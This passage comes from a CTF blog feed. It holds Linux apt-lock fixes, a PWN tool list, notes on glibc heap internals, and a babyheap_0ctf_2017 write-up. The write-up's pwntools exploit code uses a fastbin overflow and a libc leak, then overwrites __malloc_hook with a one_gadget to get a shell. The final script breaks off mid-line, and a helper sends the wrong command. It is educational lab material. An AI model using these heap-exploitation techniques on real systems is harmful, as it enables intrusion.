sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25459</span>,<span class="hljs-number">1</span> )<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux常见问题解决方法</title>
    <link href="/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2020/02/03/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)<br>E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -A | grep apt<br>sudo kill -9 processnumber<br><br>sudo rm /var/lib/dpkg/lock<br>sudo rm /var/lib/dpkg/lock-frontend<br></code></pre></td></tr></table></figure><p>E: Could not get lock /var/cache/apt/archives/lock - open (11: Resource temporarily unavailable) </p><p>E: Unable to lock directory /var/cache/apt/archives/</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo killall apt-get<br><br>sudo rm /var/lib/apt/lists/lock<br>sudo rm /var/cache/apt/archives/lock<br>sudo rm /var/lib/dpkg/lock<br></code></pre></td></tr></table></figure><p>Ubuntu-突然无法联网，且右上方没有网络标志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service network-manager stop<br>sudo rm /var/lib/NetworkManager/NetworkManager.state <br>sudo service network-manager start<br></code></pre></td></tr></table></figure><p>来自 <a href="http://yoursite.com/">咲夜南梦’s 博客</a>，<a href="[https://196011564.github.io/2018/12/23/Ubuntu-%E7%AA%81%E7%84%B6%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91/](https://196011564.github.io/2018/12/23/Ubuntu-突然无法联网/)">原地址</a></p><p>修改时区</p><p><a href="https://juejin.cn/post/6844904163713761294">https://juejin.cn/post/6844904163713761294</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN 环境搭建清单</title>
    <link href="/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/"/>
    <url>/2020/02/03/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<h2 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h2><p>ubuntu18、16</p><p>pwntools </p><p>edb 调试栈好</p><p>vim</p><p>libcsearcher</p><p>pwndbg 调试堆好</p><p>seccomp-tools 查看seccomp</p><p>proxychains4 apt get的快</p><h2 id="WIN-MAC"><a href="#WIN-MAC" class="headerlink" title="WIN/MAC"></a>WIN/MAC</h2><p>IDA 反汇编</p><p>die 查看32/64 和壳等</p><p><a href="http://mrbelieve.tech/2019/12/23/Pwn常用指令/">一些常用指令</a></p><p><a href="[https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/#0x05-get-started-3dsctf-2016](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn刷题之旅-(1)/#0x05-get-started-3dsctf-2016">可供参考exp from 南梦</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN环境搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆的基础知识</title>
    <link href="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><ul><li>修改某个函数的got表 为 system 的地址,然后参数准备为binsh 就可以</li><li>修改free函数为puts函数,然后某个堆里参数准备为某个函数的got表地址 就可以泄露地址了</li><li>one_gadget</li></ul><p>来源：<a href="https://www.anquanke.com/post/id/163971">https://www.anquanke.com/post/id/163971</a></p><p><strong>在 64 位程序中：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span></span><br></code></pre></td></tr></table></figure><p>申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21</p><p>1.第一个 16 字节是<strong>系统最小分配的内存</strong>，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</p><ul><li>在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</li><li>例如，如果代码中是 malloc(0) 的话，<strong>堆管理器也会分配最小内存空间给你</strong></li></ul><p>2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）<br>3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）<br>4.最后一个 1 字节是 <strong>PREV_INUSE 的值，只有 0 或 1两个值</strong></p><hr><p>1.pre size 字段。<strong>只有在前面一个堆块是空闲的时候才有指</strong>，用来指示前一个堆块的大小。前面一个堆块在使用时，他的值始终为 0<br>2.size 字段。是用来指示当前堆块的大小的（头部加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。</p><p>这三位的作用分别是：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.NON_MAIN_ARENA</span>     这个堆块是否位于主线程<br><span class="hljs-number">2</span><span class="hljs-selector-class">.IS_MAPPED</span>          记录当前 chunk 是否是由 mmap 分配的<br><span class="hljs-number">3</span><span class="hljs-selector-class">.PREV_INUSE</span>         记录前一个 chunk 块是否被分配<br></code></pre></td></tr></table></figure><p>这里重点讲解最后一位：<strong>用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1</strong>，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。</p><ul><li>所以前一个堆块的释放与否都和这两个字段（pre_size、size）的值有关，这是因为便于内存的释放操作（free）</li><li>user data 顾名思义就是用来存放用户数据的。</li></ul><h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>就算只申请10字节，内核也会分配132KB堆空间给ptmalloc2，用完内核再分配132KB。因为是主线程分配的，所以这个区域叫做 main arena。</p><p>==x/2gx &amp;main_arena==</p><p><strong>32位的程序使用 x/32xw  addr比较直观一点</strong></p><p><strong>64位的程序使用 x/64xw  addr</strong></p><h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>堆中第一个堆块,程序以后分配到的内存到要放在他的后面，就如下图的0x5578cbd73110（并且，堆向上生长</p><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214332010.png" class="" title="image-20200131214332010"><blockquote><p>FD 指向链表中前一个堆块的指针，该指针指向的是chunk的head</p><p>BK 指向链表中后一个堆块的指针，该指针也是指向chunk的head，通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</p><p>FD_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p><p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p><p>作者：合天智汇<br>链接：<a href="https://www.jianshu.com/p/5263bdbe92e2">https://www.jianshu.com/p/5263bdbe92e2</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><p>这里我把第二个和第三个都free了</p><h2 id="free-函数和-bins"><a href="#free-函数和-bins" class="headerlink" title="free 函数和 bins"></a>free 函数和 bins</h2><p>堆管理器会根据用户已经申请到的内存空间大小进行释放，<strong>来决定放入哪类 bins 当作去</strong>.</p><p>主要的 bins 分为以下几类，重点讲解 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。</p><p>调用 free 函数以后程序做了两件事：<br><strong>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</strong></p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>顾名思义，就是为了快速重新分配回内存而存在的一个结构。</p><blockquote><p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p></blockquote><p><strong>fast bin 的特性</strong></p><p><strong>1.使用单链表来维护释放的堆块</strong><br>也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。</p><p>如下图所示，此时就是一个单链表结构</p><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131214423497.png" class="" title="image-20200131214423497"><p><strong>2.采用后进先出的方式维护链表（类似于栈的结构）</strong><br>当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，<strong>会选择后面新加入的堆块拿来先进行内存分配</strong></p><p>如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。</p><p><strong>这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块</strong>，此时 main_arena 就指向了这里。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。</p><p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p></blockquote><ul><li><p>unsorted bin 与 fast bin 不同，他使用<strong>双向链表</strong>对 chunk 进行连接</p></li><li><p>unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</p></li></ul><img src="/2020/02/03/%E5%A0%86%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200131215053221.png" class="" title="image-20200131215053221">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>babyheap_0ctf_2017</title>
    <link href="/2020/02/02/babyheap_0ctf_2017/"/>
    <url>/2020/02/02/babyheap_0ctf_2017/</url>
    
    <content type="html"><![CDATA[<p>参考wp:<a href="https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2">https://blog.csdn.net/weixin_42151611/article/details/98119213?fps=1&amp;locationNum=2</a></p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129165539077.png" class="" title="image-20200129165539077"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">=====</span> <span class="hljs-string">Baby</span> <span class="hljs-string">Heap</span> <span class="hljs-string">in</span> <span class="hljs-number">2017</span> <span class="hljs-string">=====</span><br><span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">Allocate</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Size:</span> <span class="hljs-number">300</span> <br><span class="hljs-string">Allocate</span> <span class="hljs-string">Index</span> <span class="hljs-number">0</span><br><br><span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Fill</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">2</span>   <br><span class="hljs-attr">Index:</span> <span class="hljs-number">0</span><br><span class="hljs-attr">Size:</span> <span class="hljs-number">400</span><br><span class="hljs-attr">Content:</span> <br><br><span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Free</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">3</span><br><span class="hljs-attr">Index:</span> <span class="hljs-number">3</span><br><br><span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">Dump</span><br><br><span class="hljs-attr">Command:</span> <span class="hljs-number">4</span><br><span class="hljs-attr">Index:</span> <span class="hljs-number">0</span><br><br><span class="hljs-number">5</span><span class="hljs-string">.</span> <span class="hljs-string">Exit</span><br><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172302922.png" class="" title="image-20200129172302922"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172208306.png" class="" title="image-20200129172208306"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heap</span>&#123;</span><br><span class="hljs-keyword">int</span> ifExit;<br><span class="hljs-keyword">int</span> size;<br><span class="hljs-keyword">char</span> *str;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172221992.png" class="" title="image-20200129172221992"><p>这里可以看见没有检查v4跟结构体里的size大小，并且是按照v4来输入的，这样就可以覆盖到下一块</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172235026.png" class="" title="image-20200129172235026"><p>都设置为了0，这样就不能<a href="https://wiki.x10sec.org/pwn/heap/use_after_free/">Use_after_free</a></p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200129172250382.png" class="" title="image-20200129172250382"><p>先写好必须的四个功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sleep(<span class="hljs-number">0.1</span>)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">Index,payload</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(Index))<br>    sh.sendlineafter(<span class="hljs-string">&quot;Size:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    sh.sendlineafter(<span class="hljs-string">&quot;Content:&quot;</span>,<span class="hljs-built_in">str</span>(payload))<br>    sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">Index</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(Index))<br>    sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">Index</span>):</span><br>    sh.sendlineafter(<span class="hljs-string">&quot;Command:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sh.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,<span class="hljs-built_in">str</span>(Index))<br>    sleep(<span class="hljs-number">0.1</span>)<br><br></code></pre></td></tr></table></figure><p>然后，先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#0 0x00</span><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 0x20</span><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 0x40</span><br>add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#3 0x60</span><br>gdb.attach(sh)<br>heap<br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202114445460.png" class="" title="image-20200202114445460"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">2</span>)<span class="hljs-comment">#0x40</span><br>free(<span class="hljs-number">1</span>)<span class="hljs-comment">#0x20</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202114934969.png" class="" title="image-20200202114934969"><p>然后，我们通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x60</span>)    <br>fill(<span class="hljs-number">0</span>,payload)<span class="hljs-comment">#0x00</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202115823555.png" class="" title="image-20200202115823555"><p>在这里我们可以看见，由于没有限制输入长度，我们可以写入fd 8个a，bk 8个a， fd_nextsize p64(0)，bk_nextsize p64(0x21)，然后写入到下一块 我们本来已经free掉了的<code>0x20</code>中的 fd中，使他的指向 <code>0x60</code>的bin，这样我们看fastbins时就只能看见<code>0x20</code>和<code>0x60</code>了</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202121553155.png" class="" title="image-20200202121553155"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1 0x20</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202122603540.png" class="" title="image-20200202122603540"><p>这样之后，我们的目的就达成了，把一块没有free的空间放入了fastbins中</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202122724203.png" class="" title="image-20200202122724203"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">1</span>,payload) <br></code></pre></td></tr></table></figure><p>紧接着，我们把<code>0x40</code>的bk_nextsize 设为0x21,这样可以修改<code>0x60</code>的bin size为0x21(0x10 + 0x11)，绕过fastbin在分配内存的时候的检测</p><blockquote><p>BK_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</p></blockquote><p>再次<code>allocate(0x10)  #2 0x60</code>就会把之前的0x80的块分配出来</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202124220989.png" class="" title="image-20200202124220989"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202123933115.png" class="" title="image-20200202123933115"><p>然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">1</span>,payload)  <span class="hljs-comment">#1 0x20 还原#3的bin的size</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202124141267.png" class="" title="image-20200202124141267"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4#为了让#3的bin不再挨着top chunk</span><br></code></pre></td></tr></table></figure><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202132442146.png" class="" title="image-20200202132442146"><p>然后我们将<code>0x60    #3</code>free掉之后</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202132625185.png" class="" title="image-20200202132625185"><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202181236041.png" class="" title="image-20200202181236041"><p>这样fd 和bk 都指向main_arena+88处</p><p>==然后为啥dump2呢-。-==</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">io.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena: &#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena))<br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span> <br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p>0x3c4b20 可以在对应的libc中，搜索malloc_trim函数，可以在下图的地方看见</p><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202182025461.png" class="" title="image-20200202182025461"><p>也可以使用<a href="https://github.com/bash-c/main_arena_offset">main_arena_offset</a> <code>main_arena libcaddr</code>获取</p><p>Arbitrary Alloc的例行公事，最终修改malloc_hook的内容为one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">one_gadget = libc_base + <span class="hljs-number">0x4526a</span> <br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>free(<span class="hljs-number">3</span>)<br>fake_chunk_addr = main_arena - <span class="hljs-number">0x33</span><br>payload = p64(fake_chunk_addr)<br>fill(<span class="hljs-number">2</span>,payload)<br><br></code></pre></td></tr></table></figure><p>0x33</p><blockquote><p><code>p &amp;main_arena</code></p><p><code>$1 = (struct malloc_state *) 0x7f5081821b20 &lt;main_arena&gt;</code></p><p><code>x/10gx main_arena_addr-0x10</code></p><p><code>0x7f5081821b10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b20 &lt;main_arena&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b30 &lt;main_arena+16&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b40 &lt;main_arena+32&gt;:    0x0000000000000000    0x00000000000000000x7f5081821b50 &lt;main_arena+48&gt;:    0x0000000000000000    0x0000000000000000</code></p><p><code>find_fake_fast __malloc_hook_addr 0x70</code></p><p><code>FAKE CHUNKS0x7f5081821aed FAKE PREV_INUSE IS_MMAPED NON_MAIN_ARENA &#123; prev_size = 5801060741742067712,  size = 127,  fd = 0x50814e2e20000000,  bk = 0x50814e2a0000007f,  fd_nextsize = 0x7f,  bk_nextsize = 0x0&#125;</code></p><p>计算偏移</p><p><code>p/x main_arena_addr - fake_chunks_addr</code></p></blockquote><img src="/2020/02/02/babyheap_0ctf_2017/image-20200202193142303.png" class="" title="image-20200202193142303"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>sh = process(<span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sh.sendline(<span 